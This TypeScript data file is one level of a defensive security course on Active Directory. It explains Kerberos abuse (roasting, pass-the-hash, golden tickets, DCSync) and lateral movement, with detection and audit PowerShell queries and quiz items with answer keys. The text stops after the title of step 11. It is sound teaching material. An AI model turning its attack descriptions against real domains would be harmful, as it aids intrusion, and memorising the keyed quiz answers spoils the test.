import type { Level } from '../types'

const level: Level = {
  id: 'intermediate',
  title: 'Defending Active Directory',
  summary:
    'The heart of enterprise defence: how Kerberos really works and how it is abused (Kerberoasting, AS-REP roasting, pass-the-hash/ticket, golden tickets, DCSync), how to detect lateral movement, how to use attack-path analysis defensively, and how to harden AD with tiering, Protected Users and LAPS.',
  outcomes: [
    'Explain Kerberos authentication and the tickets involved',
    'Detect Kerberoasting, AS-REP roasting and credential-replay attacks',
    'Recognise golden/silver tickets and DCSync, and respond to them',
    'Detect lateral movement across PsExec, WMI and WinRM',
    'Use BloodHound-style attack-path analysis to harden AD',
    'Apply tiered admin, Protected Users and LAPS',
  ],
  steps: [
    {
      id: 'bwin-i-01',
      title: 'How Kerberos works',
      read: `Active Directory authenticates with **Kerberos**, and almost every AD attack abuses some quirk of it. You cannot defend AD without a working mental model of the ticket flow.

## The players

- **KDC** (Key Distribution Center) — runs on every Domain Controller. It has two services: the **AS** (Authentication Service) and the **TGS** (Ticket-Granting Service).
- **krbtgt** — a special account whose password hash the KDC uses to sign/encrypt tickets. Its secret is the master key of the whole domain. Remember this account; it is central to the worst attacks.

## The flow (simplified)

1. **AS-REQ / AS-REP** — you log on. Your client proves it knows your password (by encrypting a timestamp with your key — "pre-authentication"), and the KDC returns a **TGT** (Ticket-Granting Ticket), encrypted with the krbtgt key. The TGT is your proof of identity for the session.
2. **TGS-REQ / TGS-REP** — to use a service (a file share, a database), you present your TGT and ask for a **service ticket** (TGS). The KDC returns one encrypted with **that service's account key**.
3. **AP-REQ** — you present the service ticket to the service, which decrypts it with its own key and grants access.

## Why the design invites attacks

- Tickets are **encrypted with account password hashes**, so a captured ticket can sometimes be cracked *offline* to recover the account's password (Kerberoasting, AS-REP roasting).
- The **krbtgt** key signs TGTs, so anyone who steals it can forge unlimited valid TGTs for anyone (golden ticket).
- A **service account's** key decrypts its service tickets, so stealing it enables forging tickets for that service (silver ticket).
- Possession of a valid **ticket** = access, regardless of password (pass-the-ticket).

Keep this flow in mind; each following step attacks or defends one arrow in it.`,
      sample: {
        lang: 'text',
        caption: 'The Kerberos ticket flow, and where the secrets live',
        code: `CLIENT                         KDC (on the Domain Controller)
  |-- AS-REQ (pre-auth) --------->|  checks your password
  |<-- AS-REP: TGT ---------------|  TGT encrypted w/ KRBTGT key
  |                               |
  |-- TGS-REQ (TGT + "want SQL")->|  checks TGT
  |<-- TGS-REP: service ticket ---|  ticket encrypted w/ SQL acct key
  |                               |
  |-- AP-REQ: ticket ---> SQL SERVICE  decrypts w/ its own key -> access

Secrets that matter:
  KRBTGT key      -> forge ANY TGT   (golden ticket)
  service acct key-> forge ITS tickets (silver ticket) + crack offline`,
        output: `Every AD attack in this level abuses one arrow: cracking a
ticket offline, forging one from a stolen key, or replaying one.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is the `krbtgt` account so critical to the security of an entire Active Directory domain?',
        options: [
          'It is the account administrators log in with',
          'Its password hash is the key the KDC uses to encrypt/sign every TGT, so anyone who steals it can forge valid Ticket-Granting Tickets for any user — effectively unlimited, persistent domain access (a "golden ticket")',
          'It stores all user passwords in plaintext',
          'It controls Windows Update for the domain',
        ],
        answer: 1,
        explain:
          'The KDC signs and encrypts every TGT with the krbtgt key. That key is therefore the master secret of the domain: with it an attacker forges TGTs for anyone, including Domain Admin, that the KDC will accept as genuine — the golden ticket. This is why compromise of krbtgt is a full domain compromise, and why recovering from it requires resetting that specific account (covered later).',
        hint: 'What does the KDC use to encrypt the TGT, and what could you do with that key?',
      },
    },

    {
      id: 'bwin-i-02',
      title: 'Kerberoasting',
      read: `**Kerberoasting** is one of the most common real AD attacks, and it needs only a normal domain user account to start — which is what makes detecting and mitigating it so important.

## How it works

Any authenticated user can request a **service ticket** (TGS) for any account that has a **Service Principal Name (SPN)** — typically service accounts (SQL, IIS app pools, etc.). That service ticket is encrypted with the **service account's password hash**. The attacker requests the ticket, extracts it from memory, takes it **offline**, and cracks it — recovering the service account's plaintext password if it is weak.

No special rights are needed for the request; the cracking happens off the network, so it is quiet. And service accounts are often over-privileged and have old, weak, never-rotated passwords — a bad combination.

## Detection

- **Event 4769** (Kerberos service ticket requested) is the signal. Watch for:
  - A single account requesting service tickets for **many** SPNs in a short time.
  - Requests using **RC4** encryption (\`Ticket Encryption Type 0x17\`) when your domain should use AES — attackers often force RC4 because it is easier to crack.
- The volume/pattern matters more than any single 4769 (they are normal individually).

## Mitigation

- **Strong, long service-account passwords** — the whole attack fails if the password cannot be cracked. Best of all, use **Group Managed Service Accounts (gMSA)**, whose 120+ character passwords are managed and auto-rotated by AD, making offline cracking hopeless.
- **Least privilege for service accounts** — a cracked service account should not be a Domain Admin. Audit and remove excess membership.
- **Disable RC4** for Kerberos where possible; require AES.

Kerberoasting is a favourite because the request is normal and the cracking is offline — so defence is about un-crackable passwords (gMSA), least privilege, and spotting the tell-tale 4769 patterns.`,
      sample: {
        lang: 'powershell',
        caption: 'Hunting Kerberoasting in 4769 events (RC4 + high SPN count)',
        code: `Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4769 } |
  ForEach-Object {
    [pscustomobject]@{
      User = $_.Properties[0].Value      # account requesting
      SPN  = $_.Properties[2].Value      # service requested
      Enc  = $_.Properties[5].Value      # 0x17 = RC4 (suspicious)
    }
  } | Where-Object Enc -eq '0x17' |
  Group-Object User | Sort-Object Count -Descending |
  Select Count, Name -First 3`,
        output: `Count Name
----- ----
   34 CORP\\jdoe    <- one user, 34 RC4 service-ticket requests:
                      Kerberoasting. Legit users hit a handful of
                      services, not dozens via RC4.
    2 CORP\\svc-web`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is using a Group Managed Service Account (gMSA) such an effective mitigation against Kerberoasting?',
        options: [
          'gMSAs cannot have service tickets requested',
          'A gMSA’s password is 120+ characters, managed and automatically rotated by AD, so the service ticket an attacker cracks offline is protected by a password that is computationally infeasible to crack — defeating the attack’s payoff',
          'gMSAs disable Kerberos entirely',
          'gMSAs hide Event 4769',
        ],
        answer: 1,
        explain:
          'Kerberoasting works only if the service account’s password is weak enough to crack offline. A gMSA uses an extremely long, random, auto-rotated password that no offline cracking can recover in practice. The attacker can still request and extract the ticket, but it is useless — which is why gMSAs (plus least privilege and disabling RC4) are the recommended defence.',
        hint: 'The attack ends in offline password cracking. What kind of password makes that hopeless?',
      },
    },

    {
      id: 'bwin-i-03',
      title: 'AS-REP roasting and pre-authentication',
      read: `**AS-REP roasting** is Kerberoasting's cousin, and it needs *no* domain credentials at all — only knowledge of a target account name — which makes it a favourite early-stage attack.

## The pre-auth mechanism

Normally, Kerberos requires **pre-authentication**: to get a TGT, your client must first prove it knows your password (by encrypting a timestamp). This stops an attacker from freely requesting TGT material for arbitrary users.

But some accounts have **"Do not require Kerberos pre-authentication"** set (\`DONT_REQ_PREAUTH\`). For those, anyone can ask the KDC for an AS-REP, part of which is encrypted with the account's password hash — and can be taken offline and cracked. No credentials needed; just the account name and that flag.

## Why the flag exists (and why it is dangerous)

The setting exists for legacy interoperability, but it turns an account into a free offline-cracking target for anyone who can reach the DC. Attackers enumerate accounts with the flag and roast them all.

## Detection

- **Event 4768** (a TGT / AS-REP was requested) with pre-authentication not used, especially for accounts that should require it, is the signal — and requests using **RC4** are again suspicious.
- A burst of 4768s for accounts with the flag, or from an unusual source, is the pattern.

## Mitigation

- **Find and fix accounts with pre-auth disabled** — the primary defence. Query AD for the \`DONT_REQ_PREAUTH\` flag and clear it unless there is a genuine, documented reason.
- **Strong passwords** on any account that must keep the flag (so the crack fails).
- Disable RC4.

Both roasting attacks share a shape: get ticket material encrypted with an account's hash, crack offline. AS-REP roasting's distinguishing danger is that it needs no foothold — so hunting for and removing the pre-auth-disabled flag is a high-value, quick win.`,
      sample: {
        lang: 'powershell',
        caption: 'Finding the accounts that are free AS-REP roasting targets',
        code: `# accounts with "Do not require Kerberos pre-authentication"
Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true' -Properties DoesNotRequirePreAuth |
  Select SamAccountName, Enabled`,
        output: `SamAccountName Enabled
------------- -------
svc-legacy       True   <- roastable by anyone, no creds needed
oldapp           True   <- clear the flag unless truly required
# Every enabled account here can have its AS-REP requested and
# cracked offline. Fix the flag; strong passwords where it must stay.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What makes AS-REP roasting distinctly dangerous compared with Kerberoasting?',
        options: [
          'It requires Domain Admin rights',
          'It requires no domain credentials at all — only the name of an account that has Kerberos pre-authentication disabled — so even an unauthenticated attacker who can reach the DC can obtain crackable AS-REP material for those accounts',
          'It cannot be detected',
          'It only works against Domain Controllers',
        ],
        answer: 1,
        explain:
          'Kerberoasting needs at least a normal domain user to request service tickets. AS-REP roasting needs none: for any account with pre-authentication disabled, anyone who can reach the KDC can request the AS-REP and crack the hash offline. That "no foothold required" property is why finding and clearing the DONT_REQ_PREAUTH flag (and using strong passwords where it must remain) is a priority hardening step.',
        hint: 'How much access does the attacker need before starting AS-REP roasting, versus Kerberoasting?',
      },
    },

    {
      id: 'bwin-i-04',
      title: 'Pass-the-hash and pass-the-ticket',
      read: `Windows lets you authenticate with a **credential artefact** — an NTLM hash or a Kerberos ticket — not just a typed password. Attackers exploit this to move using **stolen artefacts**, never needing the plaintext.

## Pass-the-Hash (PtH)

NTLM authentication proves you know the password by using its **hash**, not the password itself. So an attacker who dumps an NTLM hash from LSASS (the credential-theft topic from the amateur level) can authenticate as that user **with the hash alone** — no cracking required. Steal a local admin's hash from one machine and, if that password is reused, walk onto every machine that shares it.

## Pass-the-Ticket (PtT)

The Kerberos equivalent: steal a **TGT or service ticket** from memory and inject ("pass") it into your own session to become that user for the ticket's lifetime. **Overpass-the-hash** ("pass-the-key") uses a stolen hash/key to request a fresh, legitimate TGT.

## Detection

These are subtle because the authentication itself looks valid. Signals:

- **NTLM logons (4624 with NTLM)** where you would expect Kerberos, or NTLM auth by accounts/hosts that normally use Kerberos.
- **Logon anomalies** — an admin account authenticating to many hosts in quick succession (lateral movement), logons from unexpected source workstations, or a ticket used from a machine other than the one it was issued to.
- **Impossible/rare combinations** — the same account active on many endpoints at once.

## Mitigation

- **Stop credential theft at the source** — Credential Guard, LSASS PPL, and not leaving privileged creds on exposed machines (amateur level).
- **Unique local admin passwords** — **LAPS** (covered later) so one stolen local hash cannot open every machine (kills PtH lateral movement).
- **Tiered admin** — so a workstation compromise never yields a hash/ticket that works on servers or DCs.
- **Protected Users group** and modern auth reduce cached credential exposure.

The key mental model: on Windows, a hash or ticket *is* a credential. Defence is (1) prevent the theft, (2) ensure a stolen one has limited reach, and (3) detect the anomalous authentication it produces.`,
      sample: {
        lang: 'text',
        caption: 'Why reused local admin passwords make pass-the-hash devastating',
        code: `Attacker dumps the local Administrator NTLM hash from PC-A.

If every PC shares that local admin password (same hash):
  hash of local Admin  ->  authenticate to PC-B, PC-C, ... PC-Z
  no cracking, no plaintext — the HASH is the key.
  One machine's hash = the whole fleet.

With LAPS (unique random local admin password per machine):
  hash from PC-A  ->  works ONLY on PC-A.
  Lateral movement via local admin dies at one host.`,
        output: `Pass-the-hash turns one stolen hash into fleet-wide access
ONLY when the password is shared. Unique per-host passwords
(LAPS) contain it to a single machine.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'In a pass-the-hash attack, why does the attacker not need to crack the password?',
        options: [
          'They already know the password',
          'NTLM authentication uses the password’s hash as the proof of identity, so possessing the hash is sufficient to authenticate as that user — the plaintext is never required',
          'Windows disables passwords during the attack',
          'The hash contains the password in plaintext',
        ],
        answer: 1,
        explain:
          'NTLM proves knowledge of the password via its hash, so the hash itself is a usable credential — "pass" it and you authenticate as the user without ever knowing or cracking the password. That is why dumping hashes from LSASS is so powerful, why reused local admin passwords let one hash open many machines, and why LAPS (unique per-host passwords) and stopping credential theft are the core defences.',
        hint: 'What does NTLM actually use to prove you know the password — and does the attacker have that?',
      },
    },

    {
      id: 'bwin-i-05',
      title: 'Golden and silver tickets',
      read: `The roasting attacks *crack* a ticket; **forged-ticket** attacks build tickets from a stolen key so the KDC (or a service) accepts them as genuine. These are among the most serious AD attacks because they grant deep, persistent, hard-to-detect access.

## Golden ticket

If an attacker steals the **krbtgt** hash (which requires prior domain-level compromise), they can **forge TGTs for anyone**, with any group membership, valid for as long as they choose. Because the TGT is signed with the real krbtgt key, the KDC trusts it completely. A golden ticket = arbitrary identity (e.g. Domain Admin), persistent across password changes of *other* accounts, and usable even for accounts that do not exist.

## Silver ticket

Steal a **service account's** key (or a computer account's) and forge **service tickets** for *that* service directly — skipping the KDC entirely (no TGS request, so no 4769 at the DC). Narrower than golden (one service) but stealthier, because the DC may never see it.

## Detection

Forged tickets are designed to look legitimate, so detection is indirect:

- **Anomalous ticket properties** — unusual lifetimes (golden tickets are often set to very long durations), tickets for accounts that do not exist, or mismatches between the TGT and account.
- **TGS requests with no preceding AS request** for that user (a TGT the DC never issued).
- **Behavioural** — the account suddenly doing Domain-Admin things; access without a corresponding normal logon; use from an unexpected host.
- Silver tickets especially require **endpoint/service-side** logging, since the DC is bypassed.

## The only real recovery from a golden ticket

Because the TGTs are signed with krbtgt, you must **reset the krbtgt password twice** (two resets, spaced by the replication interval, to fully invalidate outstanding tickets). Simply resetting Domain Admin passwords does not help — the forged TGTs remain valid until krbtgt changes. This is why krbtgt compromise is a full domain rebuild-of-trust event.

The lesson: prevent domain-level compromise in the first place (everything else in this level), monitor for the behavioural fallout, and know that krbtgt theft means a specific, deliberate recovery — not just changing admin passwords.`,
      sample: {
        lang: 'text',
        caption: 'Golden vs silver, and why recovery targets krbtgt',
        code: `GOLDEN TICKET                 SILVER TICKET
  needs: krbtgt hash            needs: a service/computer acct key
  forges: any TGT              forges: tickets for ONE service
  the KDC trusts it            skips the KDC entirely
  scope: whole domain          scope: that one service
  louder (KDC involved)        stealthier (no 4769 at the DC)

Recovery from golden ticket:
  reset Domain Admin passwords -> DOES NOT invalidate the TGTs
  reset KRBTGT password TWICE  -> invalidates all forged TGTs`,
        output: `Forged tickets are signed with a stolen key, so they look
genuine. Golden-ticket recovery is a double krbtgt reset,
not an admin password change.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'After discovering an attacker forged golden tickets, why is resetting your Domain Admin account passwords insufficient — and what is required instead?',
        options: [
          'Nothing more is needed once admin passwords change',
          'Golden tickets (TGTs) are signed with the krbtgt key, not tied to admin passwords, so they stay valid until krbtgt changes; you must reset the krbtgt account password twice (spaced by replication) to invalidate all outstanding forged tickets',
          'You must reinstall Windows on every workstation',
          'You must disable Kerberos permanently',
        ],
        answer: 1,
        explain:
          'A golden ticket’s validity comes from being signed with the krbtgt key, independent of any user’s password. Changing Domain Admin passwords does not touch krbtgt, so the forged TGTs keep working. The specific remediation is a double krbtgt password reset (two changes, separated by the replication interval) to invalidate current and cached tickets — which is why krbtgt theft is treated as a domain-wide trust recovery event.',
        hint: 'What key are the forged TGTs signed with, and does an admin password reset change that key?',
      },
    },

    {
      id: 'bwin-i-06',
      title: 'DCSync and credential replication',
      read: `**DCSync** is how an attacker steals *every* credential in the domain — including the krbtgt hash that enables golden tickets — often without ever logging on to a Domain Controller.

## How it works

Domain Controllers replicate directory data (including password hashes) between each other using the **Directory Replication Service (DRS)** protocol. An account with the right to replicate — normally only DCs and top-tier admins — can *ask a DC for the password hashes of any account*, and the DC will hand them over, because that is what replication is for.

An attacker who gains an account with the replication rights (**Replicating Directory Changes** / **-All**) can therefore run DCSync (built into Mimikatz) and pull the hash of krbtgt, every admin, every user — from a normal workstation, impersonating a DC. It is a devastating, quiet way to get the domain's crown jewels.

## Detection

- **Event 4662** — an operation on an AD object — where the properties include the **replication GUIDs** (Replicating Directory Changes), requested by an account that is **not a Domain Controller**. That combination is the DCSync signature: only DCs should ever request replication, so a workstation or user account doing so is a red alert.
- Correlate with the source host: a DC-replication request coming from a non-DC machine is almost never legitimate.

## Mitigation

- **Tightly control who has replication rights** — audit the ACL on the domain object for "Replicating Directory Changes / -All". Remove any principal that is not a DC or a genuinely required, tightly protected admin.
- **Protect tier-0** — DCSync requires an already-privileged account, so preventing the escalation that grants it (the whole tiering/least-privilege story) is the real defence.
- **Alert on 4662 replication by non-DCs** — a high-fidelity detection worth building.

DCSync is often the step just before golden tickets: pull krbtgt via DCSync, then forge TGTs forever. Detecting the replication request from a non-DC, and locking down who can replicate, breaks that chain.`,
      sample: {
        lang: 'text',
        caption: 'The DCSync signature in Event 4662 (replication by a non-DC)',
        code: `Event ID 4662  (An operation was performed on an object)
  Account Name: CORP\\jdoe            <- a normal user, NOT a DC
  Object Type:  domainDNS
  Properties:   Replicating Directory Changes All
                {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}
                Replicating Directory Changes
                {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}
  Source host:  WKSTN-14           <- a workstation, not a DC`,
        output: `Only Domain Controllers should request directory replication.
A user/workstation asking to "Replicate Directory Changes"
is DCSync — an attacker pulling password hashes (incl. krbtgt).
Alert, isolate, and investigate immediately.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What is the tell-tale detection for a DCSync attack in the Windows Security log?',
        options: [
          'A failed logon (4625) on a Domain Controller',
          'Event 4662 showing a request for the directory-replication rights ("Replicating Directory Changes / All") by an account or host that is not a Domain Controller — since only DCs should ever replicate directory data',
          'A new scheduled task (4698)',
          'A cleared log (1102)',
        ],
        answer: 1,
        explain:
          'DCSync abuses AD replication to request password hashes. Legitimately, only Domain Controllers replicate, so Event 4662 requesting the "Replicating Directory Changes" rights from a non-DC (a user or workstation) is the signature. Building an alert on that condition — and tightly restricting who holds replication rights on the domain object — is how you catch and prevent the attack that typically precedes golden tickets.',
        hint: 'Who is supposed to replicate directory data, and what does it mean if a workstation asks to?',
      },
    },

    {
      id: 'bwin-i-07',
      title: 'Detecting lateral movement',
      read: `Once an attacker has a credential, they **move laterally** — hopping from host to host toward their goal (usually the DC). The remote-execution methods they use all leave detectable traces if you are logging the right things.

## The common techniques and their signatures

- **PsExec / service creation** — copies a binary to the target's admin share (\`ADMIN$\`/\`C$\`) and runs it as a service. Signatures: **7045** (service installed) with an odd name/path, a file written to \`ADMIN$\`, and a Type-3 network logon followed by service creation.
- **WMI (\`wmic\` / \`Win32_Process.Create\`)** — remote process execution over WMI. Signatures: WMI-Activity operational log, a process whose parent is \`WmiPrvSE.exe\`, network logon preceding it.
- **WinRM / PowerShell Remoting (\`Enter-PSSession\`, \`Invoke-Command\`)** — remoting over 5985/5986. Signatures: \`wsmprovhost.exe\` as a parent process, WinRM operational logs, PowerShell 4104 on the target.
- **Remote scheduled tasks / at** — 4698 on the remote host from a network session.
- **RDP (Type 10)** — interactive lateral movement.
- **Admin share access** — 5140/5145 (a network share/file was accessed), especially \`ADMIN$\`/\`C$\` by an admin account across many hosts.

## The unifying pattern

Lateral movement is **one account authenticating to many machines** and **spawning execution remotely**. So the strongest detections are behavioural:

- An account (especially admin) with **Type-3 logons to many hosts** in a short window.
- **Remote execution parents** — \`services.exe\` spawning an odd binary, \`WmiPrvSE.exe\` or \`wsmprovhost.exe\` spawning a shell — captured via Sysmon/4688.
- Access to admin shares fanning out across the environment.

## Why Sysmon matters here

Built-in logs show the logons; **Sysmon** (process creation with parent + hashes, network connections) shows the *execution* that follows, which is where lateral movement is confirmed. Correlating "network logon → remote-exec parent → new process" across hosts is the core of catching an attacker in motion — before they reach tier 0.`,
      sample: {
        lang: 'powershell',
        caption: 'One admin account fanning out — the lateral-movement pattern',
        code: `# Type-3 (network) logons per source account across collected logs
Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4624 } |
  Where-Object { $_.Properties[8].Value -eq 3 } |    # LogonType 3
  Group-Object { $_.Properties[5].Value } |          # account
  Sort-Object Count -Descending | Select Count, Name -First 3`,
        output: `Count Name
----- ----
  118 CORP\\svc-backup   <- one account, network logons to 118 hosts
                           in an hour: textbook lateral movement / spray
    9 CORP\\jdoe
    4 CORP\\admin2
# Pair with Sysmon: does svc-backup's arrival spawn services.exe
# -> odd .exe on each target? That confirms remote execution.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is Sysmon (or process-creation logging with parent process) so valuable for confirming lateral movement, on top of logon events?',
        options: [
          'It blocks remote connections',
          'Logon events show an account authenticating to hosts, but process-creation-with-parent reveals the remote execution that follows — e.g. services.exe, WmiPrvSE.exe or wsmprovhost.exe spawning an unexpected binary — which is where PsExec/WMI/WinRM lateral movement is actually confirmed',
          'It replaces the Security log entirely',
          'It only records failed logons',
        ],
        answer: 1,
        explain:
          'A network logon alone can be benign. Lateral movement is confirmed by the *execution* that follows it: remote-exec techniques leave characteristic parent processes (services.exe for PsExec-style service creation, WmiPrvSE.exe for WMI, wsmprovhost.exe for WinRM) spawning attacker binaries. Sysmon captures process creation with parent and hashes, letting you correlate "logon → remote-exec parent → new process" across hosts and catch the attacker in motion.',
        hint: 'The logon says someone connected; what tells you they then *ran something* remotely?',
      },
    },

    {
      id: 'bwin-i-08',
      title: 'Attack-path analysis with BloodHound',
      read: `Attackers do not see your AD as an org chart — they see a **graph of privilege relationships** and hunt for a path from where they are to Domain Admin. **BloodHound** maps that graph, and using it *defensively* is one of the highest-value things you can do for AD security.

## What it reveals

BloodHound collects AD relationships — group memberships, admin rights on machines, sessions (where privileged users are logged on), ACLs (who can reset whose password, who can modify a group), delegation, and more — and lets you ask graph questions like **"shortest path from any user to Domain Admin"**. It surfaces escalation routes that are invisible when you look at objects one at a time:

- A helpdesk group that can reset a password of a user who is in a group that has admin on a server where a Domain Admin has a session → an attacker chains those into DA.
- **ACL-based paths** (\`GenericAll\`, \`WriteDACL\`, \`ForceChangePassword\`) that grant control without obvious group membership.
- Excessive local-admin rights and dangerous **Kerberos delegation** configurations.

## Using it as a defender

1. **Run the collector** on your own domain (with permission), load the data, and look at the attack paths *to your tier-0 assets*.
2. **Find and cut the edges** that create dangerous shortcuts: remove the excess ACL, empty the over-privileged group, fix the delegation, reduce where privileged users log on (sessions are edges too!).
3. **Re-run and confirm** the path is gone. Track "number of paths to Domain Admin" as a metric that should trend to near-zero.

## Why this changes the game

Traditional auditing checks objects in isolation and misses **chains**. BloodHound thinks like the attacker — in paths — so it finds the three-hop route to DA that no single-object review would catch. Defensive BloodHound turns "we think AD is fine" into "we have measured and reduced the concrete paths an attacker could take to domain dominance." It is the AD equivalent of attack-surface reduction, applied to privilege relationships.`,
      sample: {
        lang: 'text',
        caption: 'An attack path BloodHound finds that per-object review misses',
        code: `[user] jdoe
   --MemberOf-->      [group] Helpdesk
   --ForceChangePassword--> [user] svc-app
   --MemberOf-->      [group] Server Admins
   --AdminTo-->       [computer] APP-07
   --HasSession-->    [user] DA-alice  (Domain Admin logged on there)
   ==> jdoe can reach Domain Admin in 4 hops

Defensive fix: remove Helpdesk's ForceChangePassword on svc-app,
and stop Domain Admins logging on to tier-1 servers (cut the session).`,
        output: `No single-object audit shows this: each edge looks minor.
As a chain it is a path to DA. Cut one edge and the path breaks.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why does BloodHound-style attack-path analysis find privilege-escalation routes that traditional object-by-object auditing misses?',
        options: [
          'It has access to more logs',
          'It models AD as a graph of relationships and finds multi-hop chains — group memberships, ACL rights, and active sessions linked together — so it reveals paths to Domain Admin that look harmless when each object is reviewed in isolation',
          'It only checks Domain Admin accounts',
          'It disables dangerous accounts automatically',
        ],
        answer: 1,
        explain:
          'Escalation in AD is usually a chain: reset this account, which is in that group, which is admin on a box where a DA is logged on. Each edge looks minor alone, so per-object review misses the route. BloodHound represents the whole environment as a graph and computes paths to tier-0, exposing the concrete chains. Used defensively, you cut the edges and re-measure — reducing real attack paths to domain dominance.',
        hint: 'Is a dangerous escalation usually one bad setting, or several minor ones linked together?',
      },
    },

    {
      id: 'bwin-i-09',
      title: 'The tiered administration model',
      read: `The single most important structural defence for AD is **administrative tiering**: preventing high-value credentials from ever landing on low-value (exposed) machines, so a workstation compromise cannot escalate to the domain.

## The tiers

- **Tier 0** — the identity control plane: Domain Controllers, AD, and anything that can control them (Domain Admins, PKI, etc.). Compromise here = total.
- **Tier 1** — servers and applications (member servers, databases).
- **Tier 2** — user workstations and devices (the most numerous, most exposed, most likely to be phished).

## The rules that make it work

1. **Credentials never flow downward.** A Tier-0 account (Domain Admin) is used **only** on Tier-0 systems — never to log on to a server or a workstation. Because if a DA logs on to a workstation, their credential sits in that workstation's LSASS, and a compromise of that (exposed) box hands the attacker the domain. This is the credential-theft lesson (amateur level) turned into architecture.
2. **Separate accounts per tier.** An admin has a normal Tier-2 account for email/web, a distinct Tier-1 account for servers, and a distinct Tier-0 account for DCs — never one account used everywhere.
3. **Privileged Access Workstations (PAWs).** Tier-0 admin is performed only from hardened, dedicated machines that do not browse the web or read email.
4. **Logon restrictions** enforce it — GPO/authentication policies that deny Tier-0 accounts interactive logon to lower tiers, and vice versa.

## Why it is decisive

Almost every catastrophic AD breach follows the pattern: phish a workstation → dump credentials → find a Domain Admin's credential cached on some server or workstation → become DA. Tiering breaks that chain at the "credential cached where it shouldn't be" step. It does not stop the initial compromise, but it **contains** it: a popped Tier-2 workstation yields only Tier-2 credentials, which cannot reach the servers or the domain. It is the AD expression of assume-breach and least privilege, and it is the difference between "one workstation fell" and "the company fell."`,
      sample: {
        lang: 'text',
        caption: 'Tiering breaks the standard path to Domain Admin',
        code: `WITHOUT tiering:
  phish WKSTN (Tier 2) -> dump LSASS -> a DA logged on here last week
  -> steal DA credential -> Domain Admin. One hop. Game over.

WITH tiering:
  phish WKSTN (Tier 2) -> dump LSASS -> only Tier-2 user creds present
  -> those creds are DENIED logon to servers and DCs by policy
  -> attacker is stuck at Tier 2. Blast radius contained.

Rule: a Domain Admin credential must NEVER exist in the memory
of a machine an ordinary user could compromise.`,
        output: `Tiering does not prevent the phish; it ensures the phish
cannot reach the domain. That containment is the whole point.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What is the core rule of the tiered administration model, and why does it stop most catastrophic AD breaches?',
        options: [
          'Use one very strong password for the Domain Admin account',
          'High-tier credentials (e.g. Domain Admin) must never be used on lower-tier, exposed systems — so when a workstation is compromised its memory contains no privileged credential to steal, breaking the usual "phish a workstation, harvest a cached DA credential, own the domain" chain',
          'Encrypt all Domain Controllers with BitLocker',
          'Disable Kerberos on workstations',
        ],
        answer: 1,
        explain:
          'The typical breach escalates by finding a privileged credential cached on an exposed machine. Tiering forbids that: Domain Admin accounts are used only on Tier-0 systems (ideally from PAWs), enforced by logon restrictions, so a compromised workstation yields only low-tier credentials that policy denies from servers and DCs. The initial compromise still happens, but it is contained to its tier — which is what prevents the escalation to domain dominance.',
        hint: 'Where must a Domain Admin credential never end up, and what does that deny the attacker who pops a workstation?',
      },
    },

    {
      id: 'bwin-i-10',
      title: 'Protected Users, LAPS and delegation',
      read: `Beyond tiering, a set of concrete AD features materially reduce credential-theft and escalation risk. Deploying them is standard intermediate hardening.

## LAPS (Local Administrator Password Solution)

LAPS gives **every machine a unique, random, automatically rotated local Administrator password**, stored securely in AD and readable only by authorised admins. This directly kills **pass-the-hash lateral movement via the local admin account**: a hash stolen from one machine no longer opens any other, because each machine's local admin password is different. It is a free, high-impact deployment (Windows LAPS is now built in).

## Protected Users group

Members of the **Protected Users** group get stronger credential handling automatically: no NTLM, no cached plaintext, no weak (DES/RC4) Kerberos, and no long-lived credential caching. Putting your privileged (tier-0) accounts in Protected Users reduces what an attacker can steal if a machine those accounts touched is compromised — a strong complement to tiering. (Test first: the restrictions can break legacy scenarios by design.)

## Kerberos delegation — the hidden danger

**Delegation** lets a service act on behalf of a user (e.g. a web app accessing a database as you). Misconfigured, it is a serious escalation path:

- **Unconstrained delegation** — a server so configured caches the **TGTs** of everyone who authenticates to it. Compromise that server and you harvest TGTs, potentially including a Domain Admin's. Treat any unconstrained-delegation host (other than DCs) as tier-0-critical and migrate it off.
- **Constrained / resource-based constrained delegation** — safer, but still must be reviewed; abusable if an attacker controls the right object.

Audit delegation: find unconstrained-delegation computers and dangerous constrained configs, and tighten them.

## The pattern

LAPS contains local-admin PtH, Protected Users hardens privileged credentials, and fixing delegation removes credential-harvesting and impersonation shortcuts. None require new products — they are configuration of AD itself. Combined with tiering, they turn "credentials are stealable and reusable everywhere" into "stolen credentials are unique, hardened, and contained."`,
      sample: {
        lang: 'powershell',
        caption: 'Auditing for unconstrained delegation (a credential-harvesting risk)',
        code: `# computers trusted for UNCONSTRAINED delegation (excl. DCs)
Get-ADComputer -Filter 'TrustedForDelegation -eq $true' -Properties TrustedForDelegation |
  Select Name, TrustedForDelegation`,
        output: `Name       TrustedForDelegation
----       --------------------
APP-LEGACY True   <- caches the TGT of EVERYONE who connects.
                     Compromise it and harvest a DA's TGT. Migrate to
                     constrained delegation; treat as tier-0 until then.
# (DCs legitimately show here; a random app server should not.)`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'How does deploying LAPS specifically defeat pass-the-hash lateral movement via the local Administrator account?',
        options: [
          'It disables the local Administrator account everywhere',
          'It gives every machine a unique, randomly generated, rotating local Administrator password, so the local admin hash stolen from one machine no longer authenticates to any other — the shared-password condition that pass-the-hash relies on is removed',
          'It encrypts the LSASS process',
          'It forces all logons to use Kerberos',
        ],
        answer: 1,
        explain:
          'Pass-the-hash across machines works when they share a local admin password (identical hash). LAPS makes each machine’s local admin password unique and rotated, so a hash lifted from one host is useless on the next. That removes one of the most reliable lateral-movement techniques with a simple, free, built-in configuration — best paired with Protected Users and fixed delegation.',
        hint: 'Pass-the-hash across machines needs the password to be the same. What does LAPS do to that?',
      },
    },

    {
      id: 'bwin-i-11',
      title: 'Windows LOLBins and EDR',
